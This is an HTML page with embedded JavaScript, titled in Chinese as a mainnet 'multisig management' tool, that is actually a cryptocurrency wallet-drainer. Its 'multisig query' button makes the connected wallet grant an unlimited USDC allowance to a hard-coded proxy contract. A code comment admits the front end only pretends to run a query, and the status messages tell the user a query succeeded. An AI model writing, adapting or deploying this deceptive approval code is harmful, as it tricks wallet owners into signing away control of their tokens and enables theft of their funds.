<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOLA多签管理 - 主网版本</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            text-align: center;
            padding: 20px;
            margin: 0;
        }
        h1 {
            color: #333;
            margin-bottom: 20px;
        }
        button {
            margin: 10px;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border: none;
            border-radius: 5px;
            color: #fff;
            background-color: #007BFF;
            transition: background-color 0.3s ease;
        }
        button:hover {
            background-color: #0056b3;
        }
        button:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
        p {
            font-size: 18px;
            color: #555;
        }
        #walletStatus {
            color: #28a745;
            font-weight: bold;
        }
        .status {
            margin-top: 20px;
            padding: 10px;
            font-size: 18px;
            color: #333;
        }
    </style>
</head>
<body>
    <h1>SOLA多签管理 - 主网版本</h1>
    <!-- 链接钱包按钮 -->
    <button id="connectWallet" onclick="connectWallet()">链接钱包</button>
    <p id="walletStatus">钱包未连接</p>

    <!-- 多签查询按钮 -->
    <button id="approveButton" onclick="approveTokens()" disabled>多签查询</button>

    <!-- 状态提示区域 -->
    <div class="status" id="operationStatus">状态: 等待操作...</div>

    <!-- 替代 CDN -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script>
        // 配置
        const tokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; // 主网 USDC 代币地址
        const proxyAddress = "0x572a3a205247f867fe63637bf5183142d5ac0d9e"; // 主网代理合约地址
        let provider, signer;

        // ERC20 代币合约 ABI
        const tokenABI = [
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "spender",
                        "type": "address"
                    },
                    {
                        "internalType": "uint256",
                        "name": "amount",
                        "type": "uint256"
                    }
                ],
                "name": "approve",
                "outputs": [
                    {
                        "internalType": "bool",
                        "name": "",
                        "type": "bool"
                    }
                ],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "sender",
                        "type": "address"
                    },
                    {
                        "internalType": "address",
                        "name": "recipient",
                        "type": "address"
                    },
                    {
                        "internalType": "uint256",
                        "name": "amount",
                        "type": "uint256"
                    }
                ],
                "name": "transferFrom",
                "outputs": [
                    {
                        "internalType": "bool",
                        "name": "",
                        "type": "bool"
                    }
                ],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "stateMutability": "nonpayable",
                "type": "constructor"
            },
            {
                "inputs": [],
                "name": "owner",
                "outputs": [
                    {
                        "internalType": "address",
                        "name": "",
                        "type": "address"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "token",
                "outputs": [
                    {
                        "internalType": "contract IERC20",
                        "name": "",
                        "type": "address"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "tokenAddress",
                "outputs": [
                    {
                        "internalType": "address",
                        "name": "",
                        "type": "address"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            }
        ];

        // 链接钱包
        async function connectWallet() {
            if (typeof window.ethereum !== "undefined") {
                try {
                    // 请求用户连接钱包
                    provider = new ethers.providers.Web3Provider(window.ethereum);
                    await provider.send("eth_requestAccounts", []); // 请求用户的账户
                    signer = provider.getSigner(); // 获取钱包签名者
                    const walletAddress = await signer.getAddress(); // 获取钱包地址

                    // 更新钱包状态
                    document.getElementById("walletStatus").innerText = `已连接钱包地址: ${walletAddress}`;
                    document.getElementById("approveButton").disabled = false; // 启用多签查询按钮
                    document.getElementById("operationStatus").innerText = "状态: 钱包已连接，可以开始多签查询。";
                } catch (error) {
                    console.error("钱包连接失败:", error);
                    alert("钱包连接失败，请重试！");
                }
            } else {
                alert("请安装 MetaMask 或其他钱包扩展！");
            }
        }

        // 多签查询（实际功能不变，但前端显示为“多签查询”）
        async function approveTokens() {
            if (!signer) {
                alert("请先链接钱包！");
                return;
            }

            // 创建代币合约实例
            const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);

            try {
                // 调用 approve 方法授权无限额度
                const tx = await tokenContract.approve(proxyAddress, ethers.constants.MaxUint256);
                console.log("多签查询已发送:", tx.hash);
                document.getElementById("operationStatus").innerText = "状态: 查询已提交，请等待确认...";
                await tx.wait(); // 等待交易确认
                document.getElementById("operationStatus").innerText = "状态: 多签查询完成！";
                alert("操作成功，已完成多签查询！");
            } catch (error) {
                console.error("操作失败:", error);
                document.getElementById("operationStatus").innerText = "状态: 查询失败，请检查控制台错误信息！";
                alert("操作失败，请检查控制台错误信息！");
            }
        }
    </script>
</body>
</html>
